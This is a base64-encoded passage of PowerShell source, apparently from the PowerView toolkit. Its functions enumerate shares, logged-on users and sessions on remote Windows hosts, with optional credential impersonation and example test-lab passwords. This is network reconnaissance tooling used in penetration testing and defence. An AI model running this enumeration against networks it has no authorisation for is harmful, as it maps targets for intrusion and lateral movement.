b2dpbicgJycKICAgICAgICAgICAgICAgICAgICAgICAgIyAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgIyAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAjICAgICAkTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1B3ZExhc3RTZXQnICcnCiAgICAgICAgICAgICAgICAgICAgICAgICMgICAgICRNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUHdkRXhwaXJlZCcgJycKICAgICAgICAgICAgICAgICAgICAgICAgIyAgICAgJE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VyRmxhZ3MnICcnCiAgICAgICAgICAgICAgICAgICAgICAgICMgfQogICAgICAgICAgICAgICAgICAgICAgICAjIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAjICAgICAjIHRyYW5zbGF0ZSB0aGUgYmluYXJ5IHNpZCB0byBhIHN0cmluZwogICAgICAgICAgICAgICAgICAgICAgICAjICAgICAkTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1NJRCcgKChOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyKCRMb2NhbFVzZXIuSW52b2tlR2V0KCdPYmplY3RTSUQnKSwwKSkuVmFsdWUpCiAgICAgICAgICAgICAgICAgICAgICAgICMgICAgICRNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnRGVzY3JpcHRpb24nICgkTG9jYWxVc2VyLkRlc2NyaXB0aW9uKQoKICAgICAgICAgICAgICAgICAgICAgICAgIyAgICAgaWYgKCRJc0dyb3VwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICMgICAgICAgICAkTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1B3ZExhc3RTZXQnICcnCiAgICAgICAgICAgICAgICAgICAgICAgICMgICAgICAgICAkTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1B3ZEV4cGlyZWQnICcnCiAgICAgICAgICAgICAgICAgICAgICAgICMgICAgICAgICAkTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1VzZXJGbGFncycgJycKICAgICAgICAgICAgICAgICAgICAgICAgIyAgICAgICAgICRNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnRGlzYWJsZWQnICcnCiAgICAgICAgICAgICAgICAgICAgICAgICMgICAgICAgICAkTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0xhc3RMb2dpbicgJycKICAgICAgICAgICAgICAgICAgICAgICAgIyAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAjICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgIyAgICAgICAgICRNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUHdkTGFzdFNldCcgKCAoR2V0LURhdGUpLkFkZFNlY29uZHMoLSRMb2NhbFVzZXIuUGFzc3dvcmRBZ2VbMF0pKQogICAgICAgICAgICAgICAgICAgICAgICAjICAgICAgICAgJE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdQd2RFeHBpcmVkJyAoICRMb2NhbFVzZXIuUGFzc3dvcmRFeHBpcmVkWzBdIC1lcSAnMScpCiAgICAgICAgICAgICAgICAgICAgICAgICMgICAgICAgICAkTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1VzZXJGbGFncycgKCAkTG9jYWxVc2VyLlVzZXJGbGFnc1swXSApCiAgICAgICAgICAgICAgICAgICAgICAgICMgICAgICAgICAjIFVBQyBmbGFncyBvZiAweDIgbWVhbiB0aGUgYWNjb3VudCBpcyBkaXNhYmxlZAogICAgICAgICAgICAgICAgICAgICAgICAjICAgICAgICAgJE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdEaXNhYmxlZCcgJCgoJExvY2FsVXNlci5Vc2VyRmxhZ3MudmFsdWUgLWJhbmQgMikgLWVxIDIpCiAgICAgICAgICAgICAgICAgICAgICAgICMgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAjICAgICAgICAgICAgICRNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTGFzdExvZ2luJyAoICRMb2NhbFVzZXIuTGFzdExvZ2luWzBdKQogICAgICAgICAgICAgICAgICAgICAgICAjICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAjICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICAjICAgICAgICAgICAgICRNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTGFzdExvZ2luJyAnJwogICAgICAgICAgICAgICAgICAgICAgICAjICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAjICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICMgfQoKICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlcgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LU5ldExvY2FsR3JvdXBNZW1iZXJdIEVycm9yIGZvciAkQ29tcHV0ZXIgOiAkXyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1OZXRTaGFyZSB7CjwjCi5TWU5PUFNJUwoKUmV0dXJucyBvcGVuIHNoYXJlcyBvbiB0aGUgbG9jYWwgKG9yIGEgcmVtb3RlKSBtYWNoaW5lLgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBQU1JlZmxlY3QsIEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiwgSW52b2tlLVJldmVydFRvU2VsZiAgCgouREVTQ1JJUFRJT04KClRoaXMgZnVuY3Rpb24gd2lsbCBleGVjdXRlIHRoZSBOZXRTaGFyZUVudW0gV2luMzJBUEkgY2FsbCB0byBxdWVyeQphIGdpdmVuIGhvc3QgZm9yIG9wZW4gc2hhcmVzLiBUaGlzIGlzIGEgcmVwbGFjZW1lbnQgZm9yICJuZXQgc2hhcmUgXFxob3N0bmFtZSIuCgouUEFSQU1FVEVSIENvbXB1dGVyTmFtZQoKU3BlY2lmaWVzIHRoZSBob3N0bmFtZSB0byBxdWVyeSBmb3Igc2hhcmVzIChhbHNvIGFjY2VwdHMgSVAgYWRkcmVzc2VzKS4KRGVmYXVsdHMgdG8gJ2xvY2FsaG9zdCcuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHJlbW90ZSBzeXN0ZW0gdXNpbmcgSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uLgoKLkVYQU1QTEUKCkdldC1OZXRTaGFyZQoKUmV0dXJucyBhY3RpdmUgc2hhcmVzIG9uIHRoZSBsb2NhbCBob3N0LgoKLkVYQU1QTEUKCkdldC1OZXRTaGFyZSAtQ29tcHV0ZXJOYW1lIHNxbHNlcnZlcgoKUmV0dXJucyBhY3RpdmUgc2hhcmVzIG9uIHRoZSAnc3Fsc2VydmVyJyBob3N0CgouRVhBTVBMRQoKR2V0LURvbWFpbkNvbXB1dGVyIHwgR2V0LU5ldFNoYXJlCgpSZXR1cm5zIGFsbCBzaGFyZXMgZm9yIGFsbCBjb21wdXRlcnMgaW4gdGhlIGRvbWFpbi4KCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpHZXQtTmV0U2hhcmUgLUNvbXB1dGVyTmFtZSBzcWxzZXJ2ZXIgLUNyZWRlbnRpYWwgJENyZWQKCi5PVVRQVVRTCgpQb3dlclZpZXcuU2hhcmVJbmZvCgpBIFBTQ3VzdG9tT2JqZWN0IHJlcHJlc2VudGluZyBhIFNIQVJFX0lORk9fMSBzdHJ1Y3R1cmUsIGluY2x1ZGluZwp0aGUgbmFtZS90eXBlL3JlbWFyayBmb3IgZWFjaCBzaGFyZSwgd2l0aCB0aGUgQ29tcHV0ZXJOYW1lIGFkZGVkLgoKLkxJTksKCmh0dHA6Ly93d3cucG93ZXJzaGVsbG1hZ2F6aW5lLmNvbS8yMDE0LzA5LzI1L2Vhc2lseS1kZWZpbmluZy1lbnVtcy1zdHJ1Y3RzLWFuZC13aW4zMi1mdW5jdGlvbnMtaW4tbWVtb3J5LwojPgoKICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuU2hhcmVJbmZvJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdIb3N0TmFtZScsICdkbnNob3N0bmFtZScsICduYW1lJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENvbXB1dGVyTmFtZSA9ICdsb2NhbGhvc3QnLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CiAgICAgICAgICAgICRMb2dvblRva2VuID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1DcmVkZW50aWFsICRDcmVkZW50aWFsCiAgICAgICAgfQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRDb21wdXRlciBpbiAkQ29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgICMgYXJndW1lbnRzIGZvciBOZXRTaGFyZUVudW0KICAgICAgICAgICAgJFF1ZXJ5TGV2ZWwgPSAxCiAgICAgICAgICAgICRQdHJJbmZvID0gW0ludFB0cl06Olplcm8KICAgICAgICAgICAgJEVudHJpZXNSZWFkID0gMAogICAgICAgICAgICAkVG90YWxSZWFkID0gMAogICAgICAgICAgICAkUmVzdW1lSGFuZGxlID0gMAoKICAgICAgICAgICAgIyBnZXQgdGhlIHJhdyBzaGFyZSBpbmZvcm1hdGlvbgogICAgICAgICAgICAkUmVzdWx0ID0gJE5ldGFwaTMyOjpOZXRTaGFyZUVudW0oJENvbXB1dGVyLCAkUXVlcnlMZXZlbCwgW3JlZl0kUHRySW5mbywgLTEsIFtyZWZdJEVudHJpZXNSZWFkLCBbcmVmXSRUb3RhbFJlYWQsIFtyZWZdJFJlc3VtZUhhbmRsZSkKCiAgICAgICAgICAgICMgbG9jYXRlIHRoZSBvZmZzZXQgb2YgdGhlIGluaXRpYWwgaW50UHRyCiAgICAgICAgICAgICRPZmZzZXQgPSAkUHRySW5mby5Ub0ludDY0KCkKCiAgICAgICAgICAgICMgMCA9IHN1Y2Nlc3MKICAgICAgICAgICAgaWYgKCgkUmVzdWx0IC1lcSAwKSAtYW5kICgkT2Zmc2V0IC1ndCAwKSkgewoKICAgICAgICAgICAgICAgICMgd29yayBvdXQgaG93IG11Y2ggdG8gaW5jcmVtZW50IHRoZSBwb2ludGVyIGJ5IGZpbmRpbmcgb3V0IHRoZSBzaXplIG9mIHRoZSBzdHJ1Y3R1cmUKICAgICAgICAgICAgICAgICRJbmNyZW1lbnQgPSAkU0hBUkVfSU5GT18xOjpHZXRTaXplKCkKCiAgICAgICAgICAgICAgICAjIHBhcnNlIGFsbCB0aGUgcmVzdWx0IHN0cnVjdHVyZXMKICAgICAgICAgICAgICAgIGZvciAoJGkgPSAwOyAoJGkgLWx0ICRFbnRyaWVzUmVhZCk7ICRpKyspIHsKICAgICAgICAgICAgICAgICAgICAjIGNyZWF0ZSBhIG5ldyBpbnQgcHRyIGF0IHRoZSBnaXZlbiBvZmZzZXQgYW5kIGNhc3QgdGhlIHBvaW50ZXIgYXMgb3VyIHJlc3VsdCBzdHJ1Y3R1cmUKICAgICAgICAgICAgICAgICAgICAkTmV3SW50UHRyID0gTmV3LU9iamVjdCBTeXN0ZW0uSW50cHRyIC1Bcmd1bWVudExpc3QgJE9mZnNldAogICAgICAgICAgICAgICAgICAgICRJbmZvID0gJE5ld0ludFB0ciAtYXMgJFNIQVJFX0lORk9fMQoKICAgICAgICAgICAgICAgICAgICAjIHJldHVybiBhbGwgdGhlIHNlY3Rpb25zIG9mIHRoZSBzdHJ1Y3R1cmUgLSBoYXZlIHRvIGRvIGl0IHRoaXMgd2F5IGZvciBWMgogICAgICAgICAgICAgICAgICAgICRTaGFyZSA9ICRJbmZvIHwgU2VsZWN0LU9iamVjdCAqCiAgICAgICAgICAgICAgICAgICAgJFNoYXJlIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbXB1dGVyTmFtZScgJENvbXB1dGVyCiAgICAgICAgICAgICAgICAgICAgJFNoYXJlLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5TaGFyZUluZm8nKQogICAgICAgICAgICAgICAgICAgICRPZmZzZXQgPSAkTmV3SW50UHRyLlRvSW50NjQoKQogICAgICAgICAgICAgICAgICAgICRPZmZzZXQgKz0gJEluY3JlbWVudAogICAgICAgICAgICAgICAgICAgICRTaGFyZQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICMgZnJlZSB1cCB0aGUgcmVzdWx0IGJ1ZmZlcgogICAgICAgICAgICAgICAgJE51bGwgPSAkTmV0YXBpMzI6Ok5ldEFwaUJ1ZmZlckZyZWUoJFB0ckluZm8pCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LU5ldFNoYXJlXSBFcnJvcjogJCgoW0NvbXBvbmVudE1vZGVsLldpbjMyRXhjZXB0aW9uXSAkUmVzdWx0KS5NZXNzYWdlKSIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICBFTkQgewogICAgICAgIGlmICgkTG9nb25Ub2tlbikgewogICAgICAgICAgICBJbnZva2UtUmV2ZXJ0VG9TZWxmIC1Ub2tlbkhhbmRsZSAkTG9nb25Ub2tlbgogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1OZXRMb2dnZWRvbiB7CjwjCi5TWU5PUFNJUwoKUmV0dXJucyB1c2VycyBsb2dnZWQgb24gdGhlIGxvY2FsIChvciBhIHJlbW90ZSkgbWFjaGluZS4KTm90ZTogYWRtaW5pc3RyYXRpdmUgcmlnaHRzIG5lZWRlZCBmb3IgbmV3ZXIgV2luZG93cyBPU2VzLgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBQU1JlZmxlY3QsIEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiwgSW52b2tlLVJldmVydFRvU2VsZiAgCgouREVTQ1JJUFRJT04KClRoaXMgZnVuY3Rpb24gd2lsbCBleGVjdXRlIHRoZSBOZXRXa3N0YVVzZXJFbnVtIFdpbjMyQVBJIGNhbGwgdG8gcXVlcnkKYSBnaXZlbiBob3N0IGZvciBhY3RpdmVseSBsb2dnZWQgb24gdXNlcnMuCgouUEFSQU1FVEVSIENvbXB1dGVyTmFtZQoKU3BlY2lmaWVzIHRoZSBob3N0bmFtZSB0byBxdWVyeSBmb3IgbG9nZ2VkIG9uIHVzZXJzIChhbHNvIGFjY2VwdHMgSVAgYWRkcmVzc2VzKS4KRGVmYXVsdHMgdG8gJ2xvY2FsaG9zdCcuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHJlbW90ZSBzeXN0ZW0gdXNpbmcgSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uLgoKLkVYQU1QTEUKCkdldC1OZXRMb2dnZWRvbgoKUmV0dXJucyB1c2VycyBhY3RpdmVseSBsb2dnZWQgb250byB0aGUgbG9jYWwgaG9zdC4KCi5FWEFNUExFCgpHZXQtTmV0TG9nZ2Vkb24gLUNvbXB1dGVyTmFtZSBzcWxzZXJ2ZXIKClJldHVybnMgdXNlcnMgYWN0aXZlbHkgbG9nZ2VkIG9udG8gdGhlICdzcWxzZXJ2ZXInIGhvc3QuCgouRVhBTVBMRQoKR2V0LURvbWFpbkNvbXB1dGVyIHwgR2V0LU5ldExvZ2dlZG9uCgpSZXR1cm5zIGFsbCBsb2dnZWQgb24gdXNlcnMgZm9yIGFsbCBjb21wdXRlcnMgaW4gdGhlIGRvbWFpbi4KCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpHZXQtTmV0TG9nZ2Vkb24gLUNvbXB1dGVyTmFtZSBzcWxzZXJ2ZXIgLUNyZWRlbnRpYWwgJENyZWQKCi5PVVRQVVRTCgpQb3dlclZpZXcuTG9nZ2VkT25Vc2VySW5mbwoKQSBQU0N1c3RvbU9iamVjdCByZXByZXNlbnRpbmcgYSBXS1NUQV9VU0VSX0lORk9fMSBzdHJ1Y3R1cmUsIGluY2x1ZGluZwp0aGUgVXNlck5hbWUvTG9nb25Eb21haW4vQXV0aERvbWFpbnMvTG9nb25TZXJ2ZXIgZm9yIGVhY2ggdXNlciwgd2l0aCB0aGUgQ29tcHV0ZXJOYW1lIGFkZGVkLgoKLkxJTksKCmh0dHA6Ly93d3cucG93ZXJzaGVsbG1hZ2F6aW5lLmNvbS8yMDE0LzA5LzI1L2Vhc2lseS1kZWZpbmluZy1lbnVtcy1zdHJ1Y3RzLWFuZC13aW4zMi1mdW5jdGlvbnMtaW4tbWVtb3J5LwojPgoKICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuTG9nZ2VkT25Vc2VySW5mbycpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnSG9zdE5hbWUnLCAnZG5zaG9zdG5hbWUnLCAnbmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUgPSAnbG9jYWxob3N0JywKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgQkVHSU4gewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICAkTG9nb25Ub2tlbiA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgICAgIH0KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBGb3JFYWNoICgkQ29tcHV0ZXIgaW4gJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICAjIGRlY2xhcmUgdGhlIHJlZmVyZW5jZSB2YXJpYWJsZXMKICAgICAgICAgICAgJFF1ZXJ5TGV2ZWwgPSAxCiAgICAgICAgICAgICRQdHJJbmZvID0gW0ludFB0cl06Olplcm8KICAgICAgICAgICAgJEVudHJpZXNSZWFkID0gMAogICAgICAgICAgICAkVG90YWxSZWFkID0gMAogICAgICAgICAgICAkUmVzdW1lSGFuZGxlID0gMAoKICAgICAgICAgICAgIyBnZXQgbG9nZ2VkIG9uIHVzZXIgaW5mb3JtYXRpb24KICAgICAgICAgICAgJFJlc3VsdCA9ICROZXRhcGkzMjo6TmV0V2tzdGFVc2VyRW51bSgkQ29tcHV0ZXIsICRRdWVyeUxldmVsLCBbcmVmXSRQdHJJbmZvLCAtMSwgW3JlZl0kRW50cmllc1JlYWQsIFtyZWZdJFRvdGFsUmVhZCwgW3JlZl0kUmVzdW1lSGFuZGxlKQoKICAgICAgICAgICAgIyBsb2NhdGUgdGhlIG9mZnNldCBvZiB0aGUgaW5pdGlhbCBpbnRQdHIKICAgICAgICAgICAgJE9mZnNldCA9ICRQdHJJbmZvLlRvSW50NjQoKQoKICAgICAgICAgICAgIyAwID0gc3VjY2VzcwogICAgICAgICAgICBpZiAoKCRSZXN1bHQgLWVxIDApIC1hbmQgKCRPZmZzZXQgLWd0IDApKSB7CgogICAgICAgICAgICAgICAgIyB3b3JrIG91dCBob3cgbXVjaCB0byBpbmNyZW1lbnQgdGhlIHBvaW50ZXIgYnkgZmluZGluZyBvdXQgdGhlIHNpemUgb2YgdGhlIHN0cnVjdHVyZQogICAgICAgICAgICAgICAgJEluY3JlbWVudCA9ICRXS1NUQV9VU0VSX0lORk9fMTo6R2V0U2l6ZSgpCgogICAgICAgICAgICAgICAgIyBwYXJzZSBhbGwgdGhlIHJlc3VsdCBzdHJ1Y3R1cmVzCiAgICAgICAgICAgICAgICBmb3IgKCRpID0gMDsgKCRpIC1sdCAkRW50cmllc1JlYWQpOyAkaSsrKSB7CiAgICAgICAgICAgICAgICAgICAgIyBjcmVhdGUgYSBuZXcgaW50IHB0ciBhdCB0aGUgZ2l2ZW4gb2Zmc2V0IGFuZCBjYXN0IHRoZSBwb2ludGVyIGFzIG91ciByZXN1bHQgc3RydWN0dXJlCiAgICAgICAgICAgICAgICAgICAgJE5ld0ludFB0ciA9IE5ldy1PYmplY3QgU3lzdGVtLkludHB0ciAtQXJndW1lbnRMaXN0ICRPZmZzZXQKICAgICAgICAgICAgICAgICAgICAkSW5mbyA9ICROZXdJbnRQdHIgLWFzICRXS1NUQV9VU0VSX0lORk9fMQoKICAgICAgICAgICAgICAgICAgICAjIHJldHVybiBhbGwgdGhlIHNlY3Rpb25zIG9mIHRoZSBzdHJ1Y3R1cmUgLSBoYXZlIHRvIGRvIGl0IHRoaXMgd2F5IGZvciBWMgogICAgICAgICAgICAgICAgICAgICRMb2dnZWRPbiA9ICRJbmZvIHwgU2VsZWN0LU9iamVjdCAqCiAgICAgICAgICAgICAgICAgICAgJExvZ2dlZE9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbXB1dGVyTmFtZScgJENvbXB1dGVyCiAgICAgICAgICAgICAgICAgICAgJExvZ2dlZE9uLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5Mb2dnZWRPblVzZXJJbmZvJykKICAgICAgICAgICAgICAgICAgICAkT2Zmc2V0ID0gJE5ld0ludFB0ci5Ub0ludDY0KCkKICAgICAgICAgICAgICAgICAgICAkT2Zmc2V0ICs9ICRJbmNyZW1lbnQKICAgICAgICAgICAgICAgICAgICAkTG9nZ2VkT24KICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAjIGZyZWUgdXAgdGhlIHJlc3VsdCBidWZmZXIKICAgICAgICAgICAgICAgICROdWxsID0gJE5ldGFwaTMyOjpOZXRBcGlCdWZmZXJGcmVlKCRQdHJJbmZvKQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1OZXRMb2dnZWRvbl0gRXJyb3I6ICQoKFtDb21wb25lbnRNb2RlbC5XaW4zMkV4Y2VwdGlvbl0gJFJlc3VsdCkuTWVzc2FnZSkiCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgRU5EIHsKICAgICAgICBpZiAoJExvZ29uVG9rZW4pIHsKICAgICAgICAgICAgSW52b2tlLVJldmVydFRvU2VsZiAtVG9rZW5IYW5kbGUgJExvZ29uVG9rZW4KICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBHZXQtTmV0U2Vzc2lvbiB7CjwjCi5TWU5PUFNJUwoKUmV0dXJucyBzZXNzaW9uIGluZm9ybWF0aW9uIGZvciB0aGUgbG9jYWwgKG9yIGEgcmVtb3RlKSBtYWNoaW5lLgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBQU1JlZmxlY3QsIEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiwgSW52b2tlLVJldmVydFRvU2VsZiAgCgouREVTQ1JJUFRJT04KClRoaXMgZnVuY3Rpb24gd2lsbCBleGVjdXRlIHRoZSBOZXRTZXNzaW9uRW51bSBXaW4zMkFQSSBjYWxsIHRvIHF1ZXJ5CmEgZ2l2ZW4gaG9zdCBmb3IgYWN0aXZlIHNlc3Npb25zLgoKLlBBUkFNRVRFUiBDb21wdXRlck5hbWUKClNwZWNpZmllcyB0aGUgaG9zdG5hbWUgdG8gcXVlcnkgZm9yIHNlc3Npb25zIChhbHNvIGFjY2VwdHMgSVAgYWRkcmVzc2VzKS4KRGVmYXVsdHMgdG8gJ2xvY2FsaG9zdCcuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHJlbW90ZSBzeXN0ZW0gdXNpbmcgSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uLgoKLkVYQU1QTEUKCkdldC1OZXRTZXNzaW9uCgpSZXR1cm5zIGFjdGl2ZSBzZXNzaW9ucyBvbiB0aGUgbG9jYWwgaG9zdC4KCi5FWEFNUExFCgpHZXQtTmV0U2Vzc2lvbiAtQ29tcHV0ZXJOYW1lIHNxbHNlcnZlcgoKUmV0dXJucyBhY3RpdmUgc2Vzc2lvbnMgb24gdGhlICdzcWxzZXJ2ZXInIGhvc3QuCgouRVhBTVBMRQoKR2V0LURvbWFpbkNvbnRyb2xsZXIgfCBHZXQtTmV0U2Vzc2lvbgoKUmV0dXJucyBhY3RpdmUgc2Vzc2lvbnMgb24gYWxsIGRvbWFpbiBjb250cm9sbGVycy4KCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpHZXQtTmV0U2Vzc2lvbiAtQ29tcHV0ZXJOYW1lIHNxbHNlcnZlciAtQ3JlZGVudGlhbCAkQ3JlZAoKLk9VVFBVVFMKClBvd2VyVmlldy5TZXNzaW9uSW5mbwoKQSBQU0N1c3RvbU9iamVjdCByZXByZXNlbnRpbmcgYSBXS1NUQV9VU0VSX0lORk9fMSBzdHJ1Y3R1cmUsIGluY2x1ZGluZwp0aGUgQ05hbWUvVXNlck5hbWUvVGltZS9JZGxlVGltZSBmb3IgZWFjaCBzZXNzaW9uLCB3aXRoIHRoZSBDb21wdXRlck5hbWUgYWRkZWQuCgouTElOSwoKaHR0cDovL3d3dy5wb3dlcnNoZWxsbWFnYXppbmUuY29tLzI